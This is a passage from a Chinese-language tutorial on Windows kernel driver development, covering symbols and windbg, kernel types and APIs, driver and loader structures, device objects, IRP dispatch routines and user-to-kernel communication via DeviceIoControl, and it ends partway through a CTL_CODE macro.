      <content type="html"><![CDATA[<p>驱动的开发流程：</p><p>编写代码，生成.sys文件，部署，启动，停止，卸载</p><h1 id="如何调试驱动程序"><a href="#如何调试驱动程序" class="headerlink" title="如何调试驱动程序"></a>如何调试驱动程序</h1><h2 id="什么是PDB文件？"><a href="#什么是PDB文件？" class="headerlink" title="什么是PDB文件？"></a>什么是PDB文件？</h2><ul><li>PDB文件是在我们编译工程的时候产生的，它是和对应的模块(exe或dll)一起生成出来的。   </li><li>每个模块编译的时候都可以生成自己的PDB文件。比如.exe/.dll/.sys等等。</li></ul><h2 id="windbg如何找到pdb文件"><a href="#windbg如何找到pdb文件" class="headerlink" title="windbg如何找到pdb文件"></a>windbg如何找到pdb文件</h2><ol><li><1> SRV<em>D:\Symbols\XP</em><a href="http://msdl.microsoft.com/download/symbols" target="_blank" rel="noopener">http://msdl.microsoft.com/download/symbols</a></1></li><li>kd&gt;.reload   </li></ol><h1 id="内核编程基础"><a href="#内核编程基础" class="headerlink" title="内核编程基础"></a>内核编程基础</h1><h2 id="内核API的使用"><a href="#内核API的使用" class="headerlink" title="内核API的使用"></a>内核API的使用</h2><ol><li>应用层编程我们可以使用WINDOWS提供的各种API函数，只要导入头文件&lt;windows.h&gt;就可以了，但是在内核编程的时候，我们不能像在Ring3那样直接使用。微软为内核程序提供了专用的API，只要在程序中包含相应的头文件就可以使用了，如：#include &lt;ntddk.h&gt; (假设你已经正确安装了WDK)   </li><li>在应用层编程的时候，我们通过MSDN来了解函数的详细信息，在内核编程的时候，要使用WDK自己的帮助文档。   <h2 id="未导出函数的使用"><a href="#未导出函数的使用" class="headerlink" title="未导出函数的使用"></a>未导出函数的使用</h2>WDK说明文档中只包含了内核模块导出的函数，对于未导出的函数，则不能直接使用。<br>如果要使用未导出的函数，只要自己定义一个函数指针，并且为函数指针提供正确的函数地址就可以使用了。有两种办法都可以获取为导出的函数地址：<br><1> 特征码搜索<br><2> 解析内核PDB文件   </2></1></li></ol><h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><ol><li>在内核编程的时候，强烈建议大家遵守WDK的编码习惯,不要这样写：<br>  unsigned long length;    </li></ol><p>2.习惯使用WDK自己的类型<br>ULONG(unsigned long)<br>PULONG(unsigned long *)</p><p>UCHAR(unsigned char)<br>PUCHAR(unsigned char *)</p><p>UINT(unsigned int)<br>PUNIT(unsigned int *)    </p><p>VOID(void)<br>PVOID(void *)</p><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>大部分内核函数的返回值都是NTSTATUS类型（当成宏），如：<br>    NTSTATUS PsCreateSystemThread();<br>    NTSTATUS ZwOpenProcess();<br>    NTSTATUS ZwOpenEvent();<br> 这个值能说明函数执行的结果，比如：   </p><pre><code>STATUS_SUCCESS        0x00000000    成功        STATUS_INVALID_PARAMETER    0xC000000D    参数无效    STATUS_BUFFER_OVERFLOW    0x80000005    缓冲区长度不够    </code></pre><p> 当你调用的内核函数，如果返回的结果不是STATUS_SUCCESS，就说明函数执行中遇到了问题，具体是什么问题，可以在ntstatus.h文件中查看。   </p><h2 id="内核中的异常处理"><a href="#内核中的异常处理" class="headerlink" title="内核中的异常处理"></a>内核中的异常处理</h2><p>在内核中，一个小小的错误就可能导致蓝屏，比如：读写一个无效的内存地址。为了让自己的内核程序更加健壮，强烈建议大家在编写内核程序时，使用异常处。<br>Windows提供了结构化异常处理机制，一般的编译器都是支持的，如下：    </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__try&#123;</span><br><span class="line"><span class="comment">//可能出错的代码</span></span><br><span class="line">&#125;</span><br><span class="line">__except(filter_value) &#123;</span><br><span class="line"><span class="comment">//出错时要执行的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>出现异常时，可根据filter_value的值来决定程序该如果执行，当filter_value的值为：   </p><ul><li>EXCEPTION_EXECUTE_HANDLER(1)，代码进入except块   </li><li>EXCEPTION_CONTINUE_SEARCH(0)，不处理异常，由上一层调用函数处理   </li><li>EXCEPTION_CONTINUE_EXECUTION(-1)，回去继续执行错误处的代码   </li></ul><h2 id="常用的内核内存函数"><a href="#常用的内核内存函数" class="headerlink" title="常用的内核内存函数"></a>常用的内核内存函数</h2><table><thead><tr><th>C语言</th><th>内核中</th></tr></thead><tbody><tr><td>malloc</td><td>ExAllocatePool（里面的第一个参数IN POOL_TYPE：非分页内存不会放到文件中，分页的就不一定了）</td></tr><tr><td>memset</td><td>RtlFillMemory</td></tr><tr><td>memcpy</td><td>RtlMoveMemory</td></tr><tr><td>free</td><td>ExFreePool</td></tr></tbody></table><h2 id="内核字符串种类"><a href="#内核字符串种类" class="headerlink" title="内核字符串种类"></a>内核字符串种类</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">CHAR(<span class="keyword">char</span>)/WCHAR(<span class="keyword">wchar_t</span>)/ANSI_STRING/UNICODE_STRING</span><br><span class="line"></span><br><span class="line">ANSI_STRING字符串：</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STRING</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PCHAR Buffer;</span><br><span class="line">&#125;STRING;</span><br><span class="line"></span><br><span class="line">UNICODE_STRING字符串：</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaxmumLength;</span><br><span class="line">    PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING;</span><br></pre></td></tr></table></figure><h2 id="内核字符串常用函数"><a href="#内核字符串常用函数" class="headerlink" title="内核字符串常用函数"></a>内核字符串常用函数</h2><p>字符串常用的功能无非就是：<br>创建、复制、比较以及转换等等</p><table><thead><tr><th>ANSI_STRING字符串</th><th>UNICODE_STRING字符串</th></tr></thead><tbody><tr><td>RtlInitAnsiString</td><td>RtlInitUnicodeString</td></tr><tr><td>RtlCopyString</td><td>RtlCopyUnicodeString</td></tr><tr><td>RtlCompareString</td><td>RtlCompareUnicoodeString</td></tr><tr><td>RtlCompareUnicoodeString</td><td>RtlUnicodeStringToAnsiString</td></tr></tbody></table><h1 id="内核空间与内核模块"><a href="#内核空间与内核模块" class="headerlink" title="内核空间与内核模块"></a>内核空间与内核模块</h1><p>内核模块   </p><p><1> 硬件种类繁多，不可能做一个兼容所有硬件的内核，所以，微软提供规定的接口格式，让硬件驱动人员安装规定的格式编写“驱动程序” 。</1></p><p><2> 这些驱动程序每一个都是一个模块，称为“内核模块”，都可以加载到内核中，都遵守PE结构。但本质上讲，任意一个.sys文件与内核文件没有区别。</2></p><h2 id="DRIVER-OBJECT"><a href="#DRIVER-OBJECT" class="headerlink" title="DRIVER_OBJECT"></a>DRIVER_OBJECT</h2><p>每个内核模块都有一个对应的结构体，来描述这个模块在内核中的：位置、大小、名称等等。   </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _DRIVER_OBJECT</span><br><span class="line">nt!_DRIVER_OBJECT<span class="comment">//驱动对象</span></span><br><span class="line">   +<span class="number">0x000</span> Type             : Int2B</span><br><span class="line">   +<span class="number">0x002</span> Size             : Int2B</span><br><span class="line">   +<span class="number">0x004</span> DeviceObject     : Ptr32 _DEVICE_OBJECT</span><br><span class="line">   +<span class="number">0x008</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> DriverStart      : Ptr32 Void<span class="comment">//重要</span></span><br><span class="line">   +<span class="number">0x010</span> DriverSize       : Uint4B<span class="comment">//重要</span></span><br><span class="line">   +<span class="number">0x014</span> DriverSection    : Ptr32 Void<span class="comment">//是个指针</span></span><br><span class="line">   +<span class="number">0x018</span> DriverExtension  : Ptr32 _DRIVER_EXTENSION</span><br><span class="line">   +<span class="number">0x01c</span> DriverName       : _UNICODE_STRING<span class="comment">//重要</span></span><br><span class="line">   .....</span><br></pre></td></tr></table></figure><p>DeviceObject：这个参数是设备链，因为一个驱动对象可能有多个设备。   </p><p>可以用上面的DriverSection，这是个链表，找到其他所有的内核模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">nt!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +0x000 InLoadOrderLinks : _LIST_ENTRY//后面的模块</span><br><span class="line">   +0x008 InMemoryOrderLinks : _LIST_ENTRY</span><br><span class="line">   +0x010 InInitializationOrderLinks : _LIST_ENTRY</span><br><span class="line">   +0x018 DllBase          : Ptr32 Void//这个模块从哪开始</span><br><span class="line">   +0x01c EntryPoint       : Ptr32 Void</span><br><span class="line">   +0x020 SizeOfImage      : Uint4B//模块多大</span><br><span class="line">   +0x024 FullDllName      : _UNICODE_STRING//完整的模块名</span><br><span class="line">   +0x02c BaseDllName      : _UNICODE_STRING</span><br><span class="line">   +0x034 Flags            : Uint4B</span><br><span class="line">   +0x038 LoadCount        : Uint2B</span><br><span class="line">   +0x03a TlsIndex         : Uint2B</span><br><span class="line">   +0x03c HashLinks        : _LIST_ENTRY</span><br><span class="line">   +0x03c SectionPointer   : Ptr32 Void</span><br><span class="line">   +0x040 CheckSum         : Uint4B</span><br><span class="line">   +0x044 TimeDateStamp    : Uint4B</span><br><span class="line">   +0x044 LoadedImports    : Ptr32 Void</span><br><span class="line">   +0x048 EntryPointActivationContext : Ptr32 _ACTIVATION_CONTEXT</span><br><span class="line">   +0x04c PatchInformation : Ptr32 Void</span><br><span class="line">   +0x050 ForwarderLinks   : _LIST_ENTRY</span><br><span class="line">   +0x058 ServiceTagLinks  : _LIST_ENTRY</span><br><span class="line">   +0x060 StaticLinks      : _LIST_ENTRY</span><br><span class="line">   +0x068 ContextInformation : Ptr32 Void</span><br><span class="line">   +0x06c OriginalBase     : Uint4B</span><br><span class="line">   +0x070 LoadTime         : _LARGE_INTEGER</span><br></pre></td></tr></table></figure></p><h2 id="遍历内核模块"><a href="#遍历内核模块" class="headerlink" title="遍历内核模块"></a>遍历内核模块</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt; dt _DRIVER_OBJECT  (地址)</span><br><span class="line">&lt;2&gt; dt _LDR_DATA_TABLE_ENTRY  (DriverSection)</span><br><span class="line">&lt;3&gt; dt _LDR_DATA_TABLE_ENTRY  (InLoadOrderLinks.Flink)</span><br><span class="line"></span><br><span class="line">kd&gt; dt _LDR_DATA_TABLE_ENTRY</span><br><span class="line">nt!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +0x000 InLoadOrderLinks : _LIST_ENTRY</span><br><span class="line">   +0x008 InMemoryOrderLinks : _LIST_ENTRY</span><br><span class="line">   +0x010 InInitializationOrderLinks : _LIST_ENTRY</span><br><span class="line">   +0x018 DllBase          : Ptr32 Void</span><br><span class="line">   +0x01c EntryPoint       : Ptr32 Void</span><br><span class="line">   +0x020 SizeOfImage      : Uint4B</span><br><span class="line">   +0x024 FullDllName      : _UNICODE_STRING</span><br><span class="line">   +0x02c BaseDllName      : _UNICODE_STRING</span><br><span class="line">   +0x034 Flags            : Uint4B</span><br><span class="line">   +0x038 LoadCount        : Uint2B</span><br><span class="line">   ....</span><br></pre></td></tr></table></figure><h2 id="0环与3环通信-常规方式"><a href="#0环与3环通信-常规方式" class="headerlink" title="0环与3环通信(常规方式)"></a>0环与3环通信(常规方式)</h2><h2 id="设备对象"><a href="#设备对象" class="headerlink" title="设备对象"></a>设备对象</h2><p>我们在开发窗口程序的时候，消息被封装成一个结构体：MSG，在内核开发时，消息被封装成另外一个结构体：IRP(I/O Request Package)。<br>在窗口程序中，能够接收消息的只能是窗口对象。在内核中，能够接收IRP消息的只能是设备对象。<br>3环是MSG，0环IRP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">MSG--&gt;窗口对象</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">IRP--&gt;设备对象</span><br></pre></td></tr></table></figure><h2 id="创建设备对象"><a href="#创建设备对象" class="headerlink" title="创建设备对象"></a>创建设备对象</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建设备名称</span></span><br><span class="line">UNICODE_STRING Devicename;</span><br><span class="line">RtlInitUnicodeString(&amp;Devicename,<span class="string">L"\\Device\\MyDevice"</span>);</span><br><span class="line">或者</span><br><span class="line">UNICODE_STRING Devicename=RTL_CONSTANT_STRING(<span class="string">L"\\Device\\MyDevice"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建设备</span></span><br><span class="line">IoCreateDevice(</span><br><span class="line">pDriver,<span class="comment">//当前设备所属的驱动对象</span></span><br><span class="line"><span class="number">0</span>,                      <span class="comment">//设备扩展对象大小</span></span><br><span class="line">&amp;Devicename,<span class="comment">//设备对象的名称</span></span><br><span class="line">FILE_DEVICE_UNKNOWN,    <span class="comment">//设备类型</span></span><br><span class="line">FILE_DEVICE_SECURE_OPEN,<span class="comment">//设备特征类型</span></span><br><span class="line">FALSE,                  <span class="comment">//设备是否是独占的</span></span><br><span class="line">&amp;pDeviceObj<span class="comment">//设备对象指针</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="设置交互数据的方式"><a href="#设置交互数据的方式" class="headerlink" title="设置交互数据的方式"></a>设置交互数据的方式</h2><p>pDeviceObj-&gt;Flags |= DO_BUFFERED_IO;   </p><h3 id="缓冲区方式读写-DO-BUFFERED-IO"><a href="#缓冲区方式读写-DO-BUFFERED-IO" class="headerlink" title="缓冲区方式读写(DO_BUFFERED_IO)"></a>缓冲区方式读写(DO_BUFFERED_IO)</h3><p>操作系统将应用程序提供缓冲区的数据复制到内核模式下的地址中。相当于把3环数据复制到0环。   </p><h3 id="直接方式读写-DO-DIRECT-IO"><a href="#直接方式读写-DO-DIRECT-IO" class="headerlink" title="直接方式读写(DO_DIRECT_IO)"></a>直接方式读写(DO_DIRECT_IO)</h3><p>操作系统会将用户模式下的缓冲区锁住。然后操作系统将这段缓冲区在内核模式地址再次映射一遍。这样，用户模式的缓冲区和内核模式的缓冲区指向的是同一区域的物理内存。缺点就是要单独占用物理页面。   </p><h3 id="其他方式读写-在调用IoCreateDevice创建设备后对pDevObj-gt-Flags即不设置DO-BUFFERED-IO也不设置DO-DIRECT-IO此时就是其他方式"><a href="#其他方式读写-在调用IoCreateDevice创建设备后对pDevObj-gt-Flags即不设置DO-BUFFERED-IO也不设置DO-DIRECT-IO此时就是其他方式" class="headerlink" title="其他方式读写(在调用IoCreateDevice创建设备后对pDevObj-&gt;Flags即不设置DO_BUFFERED_IO也不设置DO_DIRECT_IO此时就是其他方式)"></a>其他方式读写(在调用IoCreateDevice创建设备后对pDevObj-&gt;Flags即不设置DO_BUFFERED_IO也不设置DO_DIRECT_IO此时就是其他方式)</h3><p>在使用其他方式读写设备时，派遣函数直接读写应用程序提供的缓冲区地址。在驱动程序中，直接操作应用程序的缓冲区地址是很危险的。只有驱动程序与应用程序运行在相同线程上下文的情况下，才能使用这种方式。  </p><h2 id="创建符号链接"><a href="#创建符号链接" class="headerlink" title="创建符号链接"></a>创建符号链接</h2><p>上面的Devicename设备对象名是0环的，不是暴露给用户层的，三环是看不到的，所以想要使用就得“创建一个别名”，即使用符号链接。   </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建符号链接名称</span></span><br><span class="line">RtlInitUnicodeString(&amp;SymbolicLinkName,<span class="string">L"\\??\\MyTestDriver"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建符号链接</span></span><br><span class="line">IoCreateSymbolicLink(&amp;SymbolicLinkName,&amp;Devicename);</span><br></pre></td></tr></table></figure><p>特别说明：</p><ol><li>设备名称的作用是给内核对象用的，如果要在Ring3访问，必须要有符号链接，其实就是一个别名，没有这个别名，在Ring3不可见。<br><del>2. 内核模式下，符号链接是以“\??\”开头的，如C 盘就是“\??\C:”</del>  </li><li><del>而在用户模式下，则是以“\.\”开头的，如C 盘就是“\.\C:（代码要转义所以一个\变2个\）</del>   </li><li>内核模式路径正常，用户模式使用内核，要\??\</li></ol><h3 id="IRP与派遣函数"><a href="#IRP与派遣函数" class="headerlink" title="IRP与派遣函数"></a>IRP与派遣函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">单击鼠标--&gt;MSG</span><br><span class="line">MSG--&gt;窗口对象</span><br><span class="line">窗口对象--&gt;单击回调</span><br><span class="line">窗口对象--&gt;双击回调</span><br><span class="line">窗口对象--&gt;其他</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">CreateFIle--&gt;IRP</span><br><span class="line">IRP--&gt;设备对象</span><br><span class="line">设备对象--&gt;派遣函数1</span><br><span class="line">设备对象--&gt;派遣函数2</span><br><span class="line">设备对象--&gt;其他</span><br></pre></td></tr></table></figure><h2 id="IRP的类型"><a href="#IRP的类型" class="headerlink" title="IRP的类型"></a>IRP的类型</h2><ol><li>当应用层通过CreateFile，ReadFile，WriteFile，CloseHandle等函数打开、从设备读取数据、向设备写入数据、关闭设备的时候，会使操作系统在0环产生出IRP_MJ_CREATE，IRP_MJ_READ，IRP_MJ_WRITE，IRP_MJ_CLOSE等不同的IRP。   </li><li>其他类型的IRP</li></ol><table><thead><tr><th>IRP类型</th><th>来源</th></tr></thead><tbody><tr><td>IRP_MJ_DEVICE_CONTROL</td><td>DeviceControl函数会产生此IRP</td></tr><tr><td>IRP_MJ_POWER</td><td>在操作系统处理电源消息时，产生次IRP</td></tr><tr><td>IRP_MJ_SHUTDOWN</td><td>关闭系统前会产生此IRP</td></tr></tbody></table><h2 id="遣函数在哪里注册呢？"><a href="#遣函数在哪里注册呢？" class="headerlink" title="遣函数在哪里注册呢？"></a>遣函数在哪里注册呢？</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _DRIVER_OBJECT</span><br><span class="line">nt!_DRIVER_OBJECT</span><br><span class="line">   +<span class="number">0x000</span> Type             : Int2B</span><br><span class="line">   +<span class="number">0x002</span> Size             : Int2B</span><br><span class="line">   +<span class="number">0x004</span> DeviceObject     : Ptr32 _DEVICE_OBJECT</span><br><span class="line">   +<span class="number">0x008</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> DriverStart      : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> DriverSize       : Uint4B</span><br><span class="line">....</span><br><span class="line">   +<span class="number">0x030</span> DriverStartIo    : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x034</span> DriverUnload     : Ptr32     <span class="keyword">void</span> <span class="comment">//卸载函数</span></span><br><span class="line">   +<span class="number">0x038</span> MajorFunction    : [<span class="number">28</span>] Ptr32     <span class="keyword">long</span> <span class="comment">//派遣函数</span></span><br></pre></td></tr></table></figure><h2 id="注册派遣函数"><a href="#注册派遣函数" class="headerlink" title="注册派遣函数"></a>注册派遣函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">( 。。。。)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="comment">//设置卸载函数   </span></span><br><span class="line">    pDriverObject-&gt;DriverUnload = 卸载函数;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//设置派遣函数   </span></span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = 派遣函数<span class="number">1</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = 派遣函数<span class="number">2</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_WRITE] = 派遣函数<span class="number">3</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_READ] = 派遣函数<span class="number">4</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_CLEANUP] = 派遣函数<span class="number">5</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_SET_INFORMATION] = 派遣函数<span class="number">6</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = 派遣函数<span class="number">7</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_SHUTDOWN] = 派遣函数<span class="number">8</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_SYSTEM_CONTROL] = 派遣函数<span class="number">9</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">IRP_MJ_MAXIMUM_FUNCTION   派遣函数的最大值</span><br></pre></td></tr></table></figure><h2 id="派遣函数的格式"><a href="#派遣函数的格式" class="headerlink" title="派遣函数的格式"></a>派遣函数的格式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">//派遣函数的格式：</span><br><span class="line"></span><br><span class="line">NTSTATUS MyDispatchFunction(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span><br><span class="line">&#123;</span><br><span class="line">//处理自己的业务...</span><br><span class="line"></span><br><span class="line">//设置返回状态</span><br><span class="line">pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;//  getlasterror()得到的就是这个值</span><br><span class="line">pIrp-&gt;IoStatus.Information = 0;//  返回给3环多少数据 没有填0</span><br><span class="line">IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">return STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="通讯流程"><a href="#通讯流程" class="headerlink" title="通讯流程"></a>通讯流程</h2><p>用户层与内核层通讯，首先要CreateFile打开设备（通讯资源），这是一个多功能的函数，可打开或创建以下对象，并返回可访问的句柄：控制台，通信资源，目录（只读打开），磁盘驱动器，文件，邮槽，管道。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CreateFile(</span><br><span class="line">L&quot;\\.\Hello&quot;,//打开设备的符号连接</span><br><span class="line">FILE_ALL_ACCESS,</span><br><span class="line">NULL,</span><br><span class="line">NULL,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">NULL</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>然后通讯通过下面函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">DeviceIoControl(</span><br><span class="line">    _In_ HANDLE hDevice,//设备句柄</span><br><span class="line">    _In_ DWORD dwIoControlCode,//操作码</span><br><span class="line">    _In_reads_bytes_opt_(nInBufferSize) LPVOID lpInBuffer,//</span><br><span class="line">    _In_ DWORD nInBufferSize,</span><br><span class="line">    _Out_writes_bytes_to_opt_(nOutBufferSize, *lpBytesReturned) LPVOID lpOutBuffer,</span><br><span class="line">    _In_ DWORD nOutBufferSize,</span><br><span class="line">    _Out_opt_ LPDWORD lpBytesReturned,</span><br><span class="line">    _Inout_opt_ LPOVERLAPPED lpOverlapped</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    参数类型及说明</span><br><span class="line">hDevice Long，设备句柄</span><br><span class="line">dwIoControlCode Long，应用程序调用驱动程序的控制命令，就是IOCTL_XXX IOCTLs。</span><br><span class="line">lpInBuffer Any，应用程序传递给驱动程序的数据缓冲区地址。</span><br><span class="line">nInBufferSize Long，应用程序传递给驱动程序的数据缓冲区大小，字节数。</span><br><span class="line">lpOutBuffer Any，驱动程序返回给应用程序的数据缓冲区地址。</span><br><span class="line">nOutBufferSize Long，驱动程序返回给应用程序的数据缓冲区大小，字节数。</span><br><span class="line">lpBytesReturned Long，驱动程序实际返回给应用程序的数据字节数地址。</span><br><span class="line">lpOverlapped OVERLAPPED，这个结构用于重叠操作。针对同步操作，请用ByVal As Long传递零值</span><br></pre></td></tr></table></figure><p>用户层跟内核层通讯的方式，有通过读写方式进行通宵，即使用ReadFile，ControlFile与内核层通讯，在内核层通过IRP处理函数得到缓冲区。  （irp-&gt;AssociatedIrp.SystemBuffer）<br>或者通过控制码通讯，简单说就是给设备对象发送控制码<br>不能随便写，需要一个宏订制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/*</span><br><span class="line">#define CTL_CODE( DeviceType, Function, Method, Access ) (                 \</span><br><span class="line">((DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method) \</span><br><span class="line">)</span><br><span class="line">#define FILE_DEVICE_UNKNOWN             0x00000022</span><br><span class="line">#define METHOD_BUFFERED                 